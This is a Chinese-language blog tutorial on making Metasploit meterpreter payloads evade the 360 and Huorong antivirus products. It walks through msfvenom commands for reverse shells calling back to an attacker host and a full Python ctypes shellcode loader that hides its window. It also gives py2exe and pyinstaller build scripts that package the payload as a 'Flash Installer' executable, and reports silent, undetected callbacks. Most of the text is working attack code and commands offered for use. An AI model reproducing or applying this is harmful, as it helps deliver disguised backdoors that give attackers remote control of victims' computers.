# MSF免杀360+火绒上线(二)


<meta name="referrer" content="no-referrer" />

## 前言

这是一个免杀系列文章。

因为自己二进制方面就是个弟弟，所以并不敢冒然称之为教程，只是记录自己在免杀过程中的各种坑以及效果对比。

其实各种办法已经在大佬们的文章中多多少少都有提到过，但是大多数都是讲述一下思路后一笔带过，然而实现的过程中往往会有各种坑。所以想着写一个系列文章，能够让像我这样的WEB选手可以用最简单的办法快速BypassAV。

记录的过程也是自己提高的过程，如果有好的思路可以联系我跟我一起交流，如果有说的不对的地方还望不吝赐教。

本文主要讲利用pyinstaller以及py2exe进行免杀。

## 正文

### 测试环境

系统环境：kali，win7 (x64)

测试杀软： 360+火绒 防护全开

免杀工具： msfvenom py2exe  pyinstaller

注：为了模拟真实环境，360跟火绒全部开启文件云上传。

文中测试方法如果没有特殊说明均为防护状态全开情况下静默上线。

### 安装过程

以下环境均为python2

```
pip install py2exe
pip install pyinstaller
```

pyinstaller直接安装失败，搜了一下需要去官网下载后然后手动install

[http://www.pyinstaller.org/downloads.html](http:_www.pyinstaller.org_downloads)

下载到本地后解压，然后通过管理员模式打开命令窗口，用 cd 命令切换至 pyinstaller的解压路径，然后运行 `python setup.py install`

### python的meterpreter

#### reverse_tcp

msf生成payload

```
msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.145.128 lport=8888 -f raw
```

保存为tcp.py

同目录下建立make_tcp.py，内容如下

```
from distutils.core import setup
import py2exe
setup(
    name='yzddmr6',
    description='Flash Installer',
    version='1.0',
    console=['tcp.py'],
    options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes',
                        'includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil', }},
    zipfile=None,
)
```

大家可以去搜一下py2exe的完整命令手册

options里要注意两点：

- bundle_files为1是指所有的链接库打包成一个exe单文件，否则你就得把整个文件夹发给对方运行才能上线
- include里面的库只能添不能减，否则会有如下报错。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418273-6160f807-740f-4155-97db-1249ada40538.png)

py2exe编译

```
python make_tcp.py py2exe
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418434-5511896d-80cc-454e-96b0-60d58f942e81.png)

然后在同目录`dist`文件夹下就会出来编译好的exe

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418553-3fe7e7e2-64fc-4c17-ad28-f5994e8b5a74.png)

静态查杀没有问题

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418639-4becfb36-de70-4e77-bcee-3590c1a8a382.png)

点击后静默上线，360跟火绒无提示

#### reverse_http

注意模版中includes中增加了urllib2库

```
from distutils.core import setup
import py2exe
setup(
    name='yzddmr6',
    description='Flash Installer',
    version='1.0',
    console=['http.py'],
    options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes',
                        'includes': 'urllib2,base64,sys,socket,struct,time,code,platform,getpass,shutil', }},
    zipfile=None,
)
```

静默上线

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418787-85e30023-90b2-48a0-8443-6c39cf416629.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900418908-efbc7e31-09ad-48e7-ac20-d2bb3dc8ee30.png)

#### reverse_https

```
from distutils.core import setup
import py2exe
setup(
    name='yzddmr6',
    description='Flash Installer',
    version='1.0',
    console=['main_view.py'],
    options={'py2exe': {'bundle_files': 1, 'packages': 'ctypes',
                        'includes': 'urllib2,ssl,base64,sys,socket,struct,time,code,platform,getpass,shutil', }},
    zipfile=None,
)
```

这里就有坑了

因为特别是defender容易拦截流量，所以我一般用的都是https

最开始的时候就生成的https的msfpayload，按照上面的办法编译成exe

win10本机上线没问题

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419000-8d1b9d44-8f77-476f-be66-02cca7e0c582.png)

但是win7下就报错，提示缺少ssl模块

但是我确实打包的时候添加了ssl模块的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419081-e914e486-a9b0-41ab-aa2f-7489dfafa42c.png)

谷歌了一下发现是win7跟win10库的问题

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419181-d6c27f41-5dea-49f7-b58a-2f2598648f2f.png)

所以如果用https的话要注意对方是什么型号的系统。

### 问题

python的meterpreter虽然生成简单，但是缺了很多功能

比如说没有migrate，还有getsystem

如果进程被关了就掉线了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419284-16e4925a-090f-413d-86f7-0015eb172d45.png)

这里用的是py2exe，用pyinstaller打包会莫名其妙出错，不知道为什么。

### windows的meterpreter

#### reverse_tcp

msf生成payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.128  LPORT=443 -e x86/shikata_ga_nai -i 20 -f py -b '\x00' > /opt/py443.py
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419376-c081ad30-c587-403a-b363-d4ef42c44462.png)

模版：win_tcp.py

```
import ctypes
from ctypes import *
buf = xxxxxx #你的shellcode
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 1:
              ctypes.windll.user32.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

这里用pyinstaller编译

```
pyinstaller -F -w win_tcp.py
```

参数说明

```
-F   产生单个的可执行文件
-w   指定程序运行时不显示命令行窗口（仅对 Windows 有效）
-i   可以指定图标
```

静默上线

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419522-4f274728-8aef-4c20-83c5-0281c4542d60.png)

#### reverse_https

```
msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.145.128  -e x86/shikata_ga_nai -i 5 -f py
```

win10静默上线

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419644-1684219b-fe58-4833-ae59-afff29745ee2.png)

win7会卡住，GG

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900419727-f8320ffa-755d-49ce-9ca7-4f1befd427bf.png)

看来https需要慎用。。。

## 最后

免杀的精髓在于小众。

用C跟C++写的已经被杀得妈都不认了，但是用python转为exe这类比较小众，所以目前还有比较好的免杀效果。

综合以上结果可以得出结论，最稳定好用的还是`windows/meterpreter/reverse_tcp`，涉及到https这种虽然加密但是有可能对方系统不支持。

## 参考

[https://www.cnblogs.com/backlion/p/6785870.html](https:_www.cnblogs.com_backlion_p_6785870)

https://blog.csdn.net/weixin_30339457/article/details/99381871

https://www.jianshu.com/p/92746f59736c

https://xz.aliyun.com/t/5768

[https://www.cnblogs.com/k8gege/p/11223393.html](https:_www.cnblogs.com_k8gege_p_11223393)

[https://www.freebuf.com/column/204005.html](https:_www.freebuf.com_column_204005)
